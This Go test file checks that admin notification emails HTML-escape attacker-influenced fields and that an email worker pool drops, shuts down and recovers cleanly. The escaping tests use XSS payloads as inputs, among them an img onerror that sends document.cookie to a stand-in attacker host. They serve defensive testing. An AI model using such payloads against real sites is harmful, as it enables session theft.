package workagent

import (
	"errors"
	"strings"
	"testing"
	"time"
)

// All admin-bound emails must HTML-escape user-and-SDK-influenced
// fields. Pin the contract on both the template-rendered path and
// the fallback path; an attacker-influenced SDK error string carrying
// an <img onerror=…> payload must not render as live HTML in the
// admin's mailbox.

func TestBuildFallbackEmail_EscapesUserInput(t *testing.T) {
	n := &AgentErrorNotifier{}
	body := n.buildFallbackEmail(
		"<script>alert(1)</script>",
		`<img src=x onerror="fetch('https://atk/'+document.cookie)">`,
		"2026-04-28 12:00:00",
		"thread-1",
		"42",
		"sess-1",
	)

	mustNotContain(t, body, "<script>alert(1)</script>")
	mustNotContain(t, body, "<img src=x onerror=")
	mustContain(t, body, "&lt;script&gt;alert(1)&lt;/script&gt;")
	mustContain(t, body, "&lt;img src=x onerror=")
}

func TestBuildErrorEmail_EscapesUserInput_FallbackPath(t *testing.T) {
	// Force the template-load to fail so we exercise the fallback
	// path. Set ServerRunPath to a directory that exists but doesn't
	// contain the template files — buildErrorEmail will fall through
	// to buildFallbackEmail.
	n := &AgentErrorNotifier{}
	body := n.buildErrorEmail(
		errors.New(`<script>alert("xss")</script>`),
		"thread-1",
		"42",
		"sess-1",
	)

	// Whether template loaded or not, the script tag must be escaped.
	mustNotContain(t, body, `<script>alert("xss")</script>`)
}

func TestBuildAccountSwitchEmail_EscapesAccountNames(t *testing.T) {
	body := buildAccountSwitchEmail(
		1,
		`Old<script>x</script>`,
		2,
		`New"onmouseover="alert(1)`,
		`<svg/onload=alert(1)>`,
	)

	mustNotContain(t, body, "<script>x</script>")
	mustNotContain(t, body, "<svg/onload=alert(1)>")
}

// Email worker pool tests pin the bounded-concurrency contract that
// replaces the previous unbounded `go func()`-per-email pattern.
// Critical paths: full queue drops (no panic), Shutdown is idempotent,
// post-Shutdown submits drop cleanly.

func TestNotifier_SubmitEmail_QueueFullDropsCleanly(t *testing.T) {
	// Build a notifier with a tiny queue and no workers so submits
	// can fill the queue without anyone draining.
	n := &AgentErrorNotifier{
		emailJobs: make(chan func(), 2),
	}

	// First two enqueue cleanly and report ok=true.
	for i := 0; i < 2; i++ {
		if !n.submitEmail("test", func() {}) {
			t.Fatalf("submit %d should have enqueued cleanly", i)
		}
	}

	// Third must drop with a warn (no panic) and report ok=false so
	// the caller can roll back any side-effect it pre-recorded
	// (e.g. rate-limit timestamp).
	type result struct{ ok bool }
	done := make(chan result, 1)
	go func() {
		done <- result{ok: n.submitEmail("test-overflow", func() {})}
	}()

	select {
	case r := <-done:
		if r.ok {
			t.Fatal("overflow submit reported ok=true; caller would skip rollback")
		}
	case <-time.After(50 * time.Millisecond):
		t.Fatal("submitEmail blocked on full queue instead of dropping")
	}
}

func TestNotifier_ClearRateLimitIfMatches_OnlyDeletesMatchingTimestamp(t *testing.T) {
	// Compare-and-delete keeps a rollback from clobbering a more
	// recent record — concurrent NotifyAgentError calls for the same
	// errorKey must not let a stale rollback wipe a fresh attempt.
	n := &AgentErrorNotifier{
		rateLimiter: map[string]time.Time{},
	}
	t1 := time.Now()
	t2 := t1.Add(time.Second)

	n.rateLimiter["k"] = t1

	// Stale rollback (says "we recorded at t1 ago, but t2 is current") — must NOT delete.
	n.rateLimiter["k"] = t2
	n.clearRateLimitIfMatches("k", t1)
	if _, exists := n.rateLimiter["k"]; !exists {
		t.Fatal("stale rollback wiped a more recent rate-limit record")
	}

	// Matching rollback — must delete.
	n.clearRateLimitIfMatches("k", t2)
	if _, exists := n.rateLimiter["k"]; exists {
		t.Fatal("matching rollback failed to delete entry")
	}

	// Missing key — must be a no-op (no panic).
	n.clearRateLimitIfMatches("absent", time.Now())
}

func TestNotifier_Shutdown_Idempotent(t *testing.T) {
	n := &AgentErrorNotifier{
		emailJobs: make(chan func(), 4),
	}
	n.Shutdown()
	n.Shutdown() // must not panic on closed channel
}

func TestNotifier_SubmitAfterShutdown_DropsCleanly(t *testing.T) {
	n := &AgentErrorNotifier{
		emailJobs: make(chan func(), 4),
	}
	n.Shutdown()

	// Send-on-closed-channel would panic the request handler.
	// submitEmail recovers it and downgrades to a drop-with-warn.
	n.submitEmail("post-shutdown", func() {})
}

func TestEmailWorker_RecoversFromPanicInJob(t *testing.T) {
	n := &AgentErrorNotifier{
		emailJobs: make(chan func(), 4),
	}
	go n.emailWorker()

	// First job panics; second job must still run.
	ran := make(chan struct{}, 2)
	n.emailJobs <- func() {
		ran <- struct{}{}
		panic("test panic")
	}
	n.emailJobs <- func() {
		ran <- struct{}{}
	}

	for i := 0; i < 2; i++ {
		select {
		case <-ran:
		case <-time.After(100 * time.Millisecond):
			t.Fatalf("worker stopped after job %d (panic recovery broken?)", i+1)
		}
	}

	close(n.emailJobs) // let worker exit cleanly
}

func mustContain(t *testing.T, haystack, needle string) {
	t.Helper()
	if !strings.Contains(haystack, needle) {
		t.Errorf("output missing expected substring %q\n--- output ---\n%s", needle, haystack)
	}
}

func mustNotContain(t *testing.T, haystack, needle string) {
	t.Helper()
	if strings.Contains(haystack, needle) {
		t.Errorf("output contains forbidden substring %q\n--- output ---\n%s", needle, haystack)
	}
}
